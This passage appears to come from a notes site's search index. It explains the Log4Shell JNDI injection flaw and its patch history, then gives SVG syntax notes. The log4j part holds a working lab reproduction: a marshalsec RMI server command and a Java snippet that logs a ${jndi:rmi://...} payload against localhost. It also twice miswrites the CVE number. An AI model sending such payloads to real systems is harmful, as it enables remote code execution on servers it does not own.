\u6ce8\u5165\u539f\u7406"},{"location":"cs/web/log4j_vuln/#cve-2021-44228_1","text":"CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002 \u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002","title":"CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406"},{"location":"cs/web/log4j_vuln/#log4j_4","text":"\u4e0b\u9762\u5206\u522b\u901a\u8fc7\u8c03\u7528 LDAP \u548c RMI \u670d\u52a1\u7684\u65b9\u5f0f\u6765\u590d\u73b0\u8fd9\u4e00 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#ldap_1","text":"\u8fdb\u884c\u8fd9\u4e00\u6f0f\u6d1e\u7684\u590d\u73b0\u9700\u8981\u4ee5\u4e0b\u4e24\u4e2a\u90e8\u5206\uff1a \u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u7528\u6765\u91cd\u5b9a\u5411\u63d0\u4f9b\u653b\u51fb\u7c7b \u9700\u8981\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\u6765\u4e3a\u5176\u63d0\u4f9b\u653b\u51fb\u7c7b \u4e00\u4e2a\u5305\u542b\u5b58\u5728\u6f0f\u6d1e\u7684 log4j \u7ec4\u4ef6\u7684 Java \u5e94\u7528","title":"LDAP \u5b9e\u73b0"},{"location":"cs/web/log4j_vuln/#rmi_1","text":"RMI \u7684\u5b9e\u73b0\u7c7b\u4f3c LDAP\uff0cExploit \u7c7b\u540c\u6837\u4f7f\u7528\u8c03\u7528\u8ba1\u7b97\u5668\u7684\u4ee3\u7801\uff0c\u901a\u8fc7 python \u5f00\u542f HTTP \u670d\u52a1\u63d0\u4f9b\u7ed9 RMI\u3002\u7136\u540e\u540c\u6837\u901a\u8fc7 marshalsec \u6765\u642d\u5efa RMI \u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3\u5728 1099\uff09\uff1a java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.RMIRefServer \"http://127.0.0.1:8888/#Exploit\" \u7565\u4fee\u6539\u4e00\u4e0b log4j \u6f0f\u6d1e\u5e94\u7528\uff0c\u4f7f\u4e4b\u8bb0\u5f55 ${jndi:rmi://127.0.0.1:1099/Exploit}\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.rmi.object.trustURLCodebase\" , \"true\" ); System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:rmi://127.0.0.1:1099/Exploit}\" ); } } \u8fd0\u884c\u53d1\u73b0\u8ba1\u7b97\u5668\u5df2\u88ab\u8c03\u51fa\uff1a","title":"RMI \u5b9e\u73b0"},{"location":"cs/web/log4j_vuln/#log4j_6","text":"\u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002 \u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002 \u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002 \u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002","title":"log4j \u6f0f\u6d1e\u4fee\u590d"},{"location":"cs/web/log4j_vuln/#reference","text":"CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228 NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228 Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html \u3010\u6f0f\u6d1e\u901a\u544a\u3011Apache Log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-44228/CVE-2021-45046\uff09. https://help.aliyun.com/noticelist/articleid/1060971232.html Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/ tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec log4j \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u53ca\u4fee\u590d\u65b9\u6848. https://zhuanlan.zhihu.com/p/444140910 JNDI \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ca\u89e3\u51b3\u65b9\u6848. https://zhuanlan.zhihu.com/p/447220806 Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm Java \u4e2d RMI \u7684\u4f7f\u7528. https://cloud.tencent.com/developer/article/1824106 Pickle, \u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u539f\u7406\u4e0e\u793a\u4f8b. https://www.cnblogs.com/wxisme/p/5296441.html Authing \u8eab\u4efd\u4e91, LDAP \u534f\u8bae\u5165\u95e8\uff08\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09. https://zhuanlan.zhihu.com/p/147768058 JNDI \u6ce8\u5165\u539f\u7406\u53ca\u5229\u7528. https://xz.aliyun.com/t/6633#toc-7 hldfight, log4j \u5b98\u65b9\u6f0f\u6d1e\u4fee\u590d\u53f2. https://blog.csdn.net/qsort_/article/details/122101423 rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608 LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623 \u4ece\u96f6\u5230\u4e00\u5e26\u4f60\u6df1\u5165 log4j2 Jndi RCE CVE-2021-44228 \u6f0f\u6d1e - 2.15.0 rc1\u7ed5\u8fc7\u8be6\u89e3. https://paper.seebug.org/1789/#0x06-2150-rc1 4ra1n, \u6d45\u8c08 Log4j2 \u4e4b 2.15.0 \u7248\u672c RCE. https://xz.aliyun.com/t/10689","title":"Reference"},{"location":"cs/web/svg/","text":"SVG \u00b6 Abstract SVG\uff08Scalable Vector Graphics\uff09\u662f\u4e00\u79cd\u57fa\u4e8e XML \u63cf\u8ff0\u77e2\u91cf\u56fe\u5f62\u7684\u56fe\u7247\u683c\u5f0f \u73b0\u884c\u6807\u51c6\u662f SVG 2\uff1a https://www.w3.org/TR/SVG/ SVG 1.1\uff1a https://www.w3.org/TR/SVG11/ SVG 2 \u4ecd\u5728 CR \u9636\u6bb5\uff0c\u533a\u522b\uff1a https://www.w3.org/TR/SVG/changes.html REC-SVG11-20110816.pdf SVG \u6807\u51c6\u6587\u6863\u8fd8\u6ca1\u6709\u5b8c\u6574\u8bfb\u8fc7\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5728\u4fee manim \u7684 SVGMobject \u7684\u65f6\u5019\u5b66\u5230\u7684 SVG \u76f8\u5173\u5185\u5bb9 SVG Namespace: http://www.w3.org/2000/svg Public Identifier for SVG 1.1: PUBLIC \"-//W3C//DTD SVG 1.1//EN\" System Identifier for the SVG 1.1 Recommendation: http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd \u5750\u6807\u7cfb\u7edf \u00b6 \u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u4e3a x \u6b63\u65b9\u5411\uff0c\u5411\u4e0b\u4e3a y \u6b63\u65b9\u5411 transform \u5c5e\u6027\u4f1a\u6539\u53d8\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u5750\u6807\u7cfb \u5e38\u89c1 EBNF \u8bed\u6cd5 \u00b6 \u4e00\u4e9b SVG \u7684 EBNF coordinate-pair : coordinate comma-wsp coordinate | coordinate negative-coordinate coordinate : number number : sign ? integer-constant | sign ? floating-point-constant negative-coordinate : \"-\" integer-constant | \"-\" floating-point-constant comma-wsp : ( wsp + comma ? wsp *) | ( comma wsp *) comma : \",\" integer-constant : digit-sequence floating-point-constant : fractional-constant exponent ? | digit-sequence exponent fractional-constant : digit-sequence ? \".\" digit-sequence | digit-sequence \".\" exponent : ( \" e \" | \" E \" ) sign ? digit-sequence sign : \"+\" | \"-\" digit-sequence : digit | digit digit-sequence digit : \"0\" | \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\" wsp : (# x20 | # x9 | # xD | # xA )+ \u4ece\u540e\u5f80\u524d\u6765\u770b\uff1a wsp\uff1a\u7a7a\u683c\uff0c\u5305\u542b\u56db\u79cd\uff0cASCII \u7801\u503c\u4e3a 0x9, 0x20, 0xA, 0xD \uff08SVG2 \u4e2d\u591a\u4e86 0xC \uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fde\u7eed\u591a\u4e2a digit: \u6570\u5b57\u5b57\u7b26\uff0c0 \u5230 9 digit-sequence: \u6570\u5b57\u5b57\u7b26\u5e8f\u5217\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u8005\u591a\u4e2a\u6570\u5b57\u5b57\u7b26 sign: \u7b26\u53f7\uff0c+ \u6216 - exponent: \u6307\u6570\uff0ce \u5927\u5c0f\u5199\u5747\u53ef\uff0c\u6307\u6570\u662f\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u5373\u6b63\uff09\u6574\u6570\uff0c\u5982 e2 E+2 E-10 \u5747\u4e3a\u5408\u6cd5 exponent fractional-constant: \u5206\u6570\u5e38\u6570\uff0c\u6574\u6570\u90e8\u5206\u4e3a 0 \u53ef\u4ee5\u7701\u7565\uff0c\u5c0f\u6570\u90e8\u5206\u4e3a 0 \u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u5982 1.2 .3 4. \u53ef\u4ee5\u8868\u793a\u4e09\u4e2a\u5206\u6570\u5e38\u6570 1.2, 0.3, 4.0 floating-point-constant: \u6d6e\u70b9\u6570\u5e38\u6570\uff0c\u53ef\u4ee5\u662f \u5206\u6570\u5e38\u6570 / \u5206\u6570\u5e38\u6570\u52a0\u6307\u6570 / \u6574\u6570\u5e38\u6570\u52a0\u6307\u6570 integer-constant: \u6574\u6570\u5e38\u6570\uff0c\u5373\u6570\u5b57\u5b57\u7b26\u5e8f\u5217 comma: \u9017\u53f7\u5b57\u7b26 , \uff0cASCII \u7801\u503c 0x2C comma-wsp: \u95f4\u9694\u7b26\uff0c\u53ef\u4ee5\u662f \u9017\u53f7 / \u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c\u52a0\u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c negative-coordinate: \u8d1f\u5750\u6807\u503c\uff0c\u53ef\u4ee5\u662f \u8d1f\u53f7\u52a0\u6574\u6570\u5e38\u6570 / \u8d1f\u53f7\u52a0\u6d6e\u70b9\u6570\u5e38\u6570 number: \u6570\u5b57\uff0c\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u6b63\uff09\u7684\u6574\u6570\u5e38\u6570\u6216\u8005\u6d6e\u70b9\u6570\u5e38\u6570 coordinate: \u5750\u6807\u503c\uff0c\u5373\u6570\u5b57 number coordinate-pair: \u5750\u6807\uff0c\u53ef\u4ee5\u662f\u4e24\u4e2a\u7528 comma-wsp \u5206\u9694\u7684\u5750\u6807\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5750\u6807\u503c\u4e3a\u8d1f\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u8fdb\u884c\u5206\u9694\uff0c\u5373 1-2 \u8868\u793a (1, -2) \u8bfb\u53d6\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u51fa\u4e0a\u9762\u7684 number \u53ef\u4ee5\u76f4\u63a5\u7528\u4e00\u4e2a\u6b63\u5219\u6765\u89e3\u51b3\uff1a [-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)? \u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u6574\u4e2a\u903b\u8f91 \u6574\u4f53\u53ef\u4ee5\u662f +- \u6216\u8005\u4e0d\u6307\u5b9a\uff1a [-+]? \u6307\u6570\u524d\u90e8\u5206\uff1a (?:\\d+(?:\\.\\d*)?|\\.\\d+) \u6709\u6574\u6570\u90e8\u5206\uff1a \\d+(?:\\.\\d*)? \u6574\u6570\u90e8\u5206\uff1a \\d+ \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:\\.\\d*)? \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a \\d* \u65e0\u6574\u6570\u90e8\u5206\uff08\u5373\u5ffd\u7565 0\uff09\uff1a \\.\\d+ \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff09\uff1a \\d+ \u6307\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:[eE][-+]?\\d+)? \u6307\u6570\u6807\u8bc6\uff1a [eE] \u7b26\u53f7\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a [-+]? \u6307\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff0c\u4e14\u662f\u6574\u6570\uff09\uff1a \\d+ \u4e3a\u4e86\u4e0d\u6355\u83b7 () \u4e2d\u7684\u5185\u5bb9\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u4f7f\u7528\u7684\u65f6\u5019\u76f4\u63a5\u628a\u5339\u914d\u5230\u7684\u5185\u5bb9\u4f20\u5165 float \u5373\u53ef\uff1a number_pattern = re . compile ( r \"[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) numbers = [ float ( x ) for x in number_pattern . findall ( number_string )] <svg> \u5143\u7d20 \u00b6 \u5728\u4e00\u4e2a SVG \u4e2d\uff0c\u53ef\u4ee5\u6709\u5f88\u591a <svg> \u5143\u7d20\uff0c\u6700\u5916\u5c42\u53ea\u6709\u4e00\u4e2a <svg> \u5143\u7d20\uff0c\u5185\u5c42\u53ef\u4ee5\u5d4c\u5957 svg \u89c4\u5b9a\u7684\u5143\u7d20\u90fd\u5728 XML \u547d\u540d\u7a7a\u95f4 http://www.w3.org/2000/svg \u4e2d\uff0c\u6240\u4ee5\u8981\u89c4\u5b9a xmlns=\"http://www.w3.org/2000/svg\" \u5c5e\u6027\uff1a version \u7248\u672c\u53f7\uff0c1.1 / 1.0 x \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 x \u5750\u6807 y \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 y \u5750\u6807 width \u89c4\u5b9a\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u662f\u957f\u5ea6\u6216\u8005\u767e\u5206\u6bd4 height \u89c4\u5b9a\u9ad8\u5ea6 \u5176\u4ed6\u7ed3\u6784\u5143\u7d20 \u00b6 <g>\uff1a\u5373 group\uff0c\u53ef\u4ee5\u6709\u5b50\u5143\u7d20\uff0c\u5e76\u4e14\u53ef\u4ee5\u6709 id \u7528\u6765\u5f15\u7528 <defs>\uff1a\u5305\u542b\u4e00\u4e9b\u5b50\u5143\u7d20\uff0c\u7528\u6765\u590d\u7528\uff0c\u4e0d\u76f4\u63a5\u663e\u793a <symbol>\uff1a\u7c7b\u4f3c <g> <use>\uff1a\u590d\u7528\uff0c\u901a\u8fc7 xlink:href \u6765\u6307\u5b9a\u5f15\u7528\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 x, y, style \u7b49\u4e00\u7cfb\u5217\u5c5e\u6027\u6765\u89c4\u5b9a\u4f4d\u7f6e\u548c\u6837\u5f0f \u5f62\u72b6\u5143\u7d20 \u00b6 \u5143\u7d20 \u5c5e\u6027 <rect> x, y \u5de6\u4e0a\u89d2\u5750\u6807 width, height \u77e9\u5f62\u5bbd\u9ad8 <circle> cx, cy \u5706\u5fc3\u5750\u6807 r \u5706\u534a\u5f84 <ellipse> cx, cy \u692d\u5706\u4e2d\u5fc3\u5750\u6807 rx, ry \u6c34\u5e73/\u5782\u76f4\u534a\u5f84 <line> x1, y1 \u8d77\u70b9\u5750\u6807 x2, y2 \u7ec8\u70b9\u5750\u6807 <polygon> points \u591a\u8fb9\u5f62\u7aef\u70b9\u5750\u6807 <polyline> points \u6298\u7ebf\u7aef\u70b9\u5750\u6807 <path> d \u8def\u5f84\u6307\u4ee4 <polygon> \u548c <polyline> \u7684 points \u8bed\u6cd5 \u00b6 EBNF \u8bed\u6cd5 \u5b83\u4eec\u7684 points \u5c5e\u6027\u7684\u503c\u90fd\u662f list-of-points \u7c7b\u578b list-of-points : wsp * coordinate-pairs ? wsp * coordinate-pairs : coordinate-pair | coordinate-pair comma-wsp coordinate-pairs \u7531\u4e0a\u9762\u7684\u89e3\u91ca\u540c\u7406\uff0c\u8fd9\u4e2a EBNF \u4e5f\u975e\u5e38\u6e05\u6670 coordinate-pairs: \u5750\u6807\u7ec4\uff0c\u7528 comma-wsp \u5206\u9694\u7684\u591a\u4e2a\u5750\u6807 list-of-points: \u70b9\u96c6\uff0c\u53ef\u4ee5\u662f \u7a7a / \u4efb\u610f\u591a\u7a7a\u683c / \u524d\u540e\u6709\u4efb\u610f\u591a\u7a7a\u683c\uff08\u542b0\uff09\u7684\u5750\u6807\u7ec4 points \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u4e3a path string\uff0cmanim \u4e2d\u5c31\u662f\u8fd9\u6837\u5904\u7406\u7684\uff0c\u5373\u628a\u6240\u6709 wsp digit \u90fd\u66ff\u6362\u4e3a \"L\" wsp digit\uff0c\u7136\u540e\u628a\u7b2c\u4e00\u4e2a L \u66ff\u6362\u4e3a M <path> \u8def\u5f84 \u00b6 <path> \u5143\u7d20\u901a\u8fc7\u5b83\u7684 d \u5c5e\u6027\u6765\u6307\u5b9a\u8def\u5f84\uff0c\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u8def\u5f84\u5b57\u7b26\u4e32\u7531\u4e00\u4e9b\u63a7\u5236\u547d\u4ee4\u548c\u540e\u9762\u63a5\u7740\u7684\u53c2\u6570\u6784\u6210\uff0c\u4e00\u5171\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff0c\u5206\u522b\u6709\u5927\u5199\u548c\u5c0f\u5199\u7684\u5f62\u5f0f \u5927\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u5c0f\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u5750\u6807\u7684\u76f8\u5bf9\u4f4d\u7f6e \u5e76\u4e14\u4e3a\u4e86\u538b\u7f29 SVG \u7684\u5927\u5c0f\uff0c\u4e5f\u6709\u4e00\u4e9b\u5141\u8bb8\u7684\u7f29\u5199\u89c4\u5219\uff1a \u53ef\u4ee5\u7701\u7565\u4e0d\u5fc5\u8981\u7684 comma-wsp \u5206\u9694\u7b26 \u5982\u679c\u591a\u6b21\u4f7f\u7528\u540c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5219\u9664\u4e86\u7b2c\u4e00\u6b21\u4ee5\u5916\u5747\u53ef\u4ee5\u7701\u7565\u547d\u4ee4 \u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5750\u6807 \u53ef\u4ee5\u4f7f\u7528\u6c34\u5e73\u548c\u5782\u76f4\u60c5\u51b5\u7684 lineto \u53ef\u4ee5\u7528 S/s/T/t \u6765\u7701\u7565\u7b2c\u4e00\u4e2a\u63a7\u5236\u70b9 \u4e0b\u9762\u4f9d\u6b21\u6765\u8bf4\u660e\u8fd9\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff1a \u547d\u4ee4 \u540d\u79f0 \u53c2\u6570 \u63cf\u8ff0 M or m moveto (x y)+ \u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u53c2\u6570\u662f\u8d77\u70b9\u5750\u6807 \u5982\u679c\u53c2\u6570\u662f\u591a\u7ec4\u5750\u6807\uff0c\u5219\u9664\u7b2c\u4e00\u4e2a\u4ee5\u5916\u90fd\u5f53\u6210 L/l \u6307\u4ee4\u7684\u53c2\u6570\u6765\u5904\u7406 Z or z closepath \u5173\u95ed\u8def\u5f84\uff0c\u5373\u4ece\u5f53\u524d\u70b9\u5230\u5f53\u524d\u5b50\u8def\u5f84\u5f00\u5934\u70b9\u753b\u4e00\u6761\u76f4\u7ebf Z \u548c z \u7684\u6548\u679c\u76f8\u540c L or l lineto (x y)+ \u4ece\u5f53\u524d\u70b9\u5f00\u59cb\u753b\u76f4\u7ebf\uff0c\u53c2\u6570\u662f\u7aef\u70b9\u5750\u6807 H or h horizontal lineto x+ \u753b\u4e00\u6761\u6c34\u5e73\u7ebf\uff0c\u5230\u6a2a\u5750\u6807 x \u7684\u4f4d\u7f6e V or v vertical lineto y+ \u753b\u4e00\u6761\u7ad6\u76f4\u7ebf\uff0c\u5230\u7eb5\u5750\u6807 y \u7684\u4f4d\u7f6e C or c curveto (x1 y1 x2 y2 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\uff0c(x2, y2) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 S or s smooth curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u7684\u7b2c\u4e8c\u4e2a\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\uff0c(x1, y1) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08CcSs\uff09\uff0c\u5219\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 Q or q quadratic bezier curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u63a7\u5236\u70b9 T or t smooth quadratic bezier curveto (x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08QqTt\uff09\uff0c\u5219\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 A or a elliptical arc \u6700\u540e\u4e00\u4e2a\u692d\u5706\u5f27\u7684\u53c2\u6570\u548c\u7528\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u6765\u8bf4\uff1a 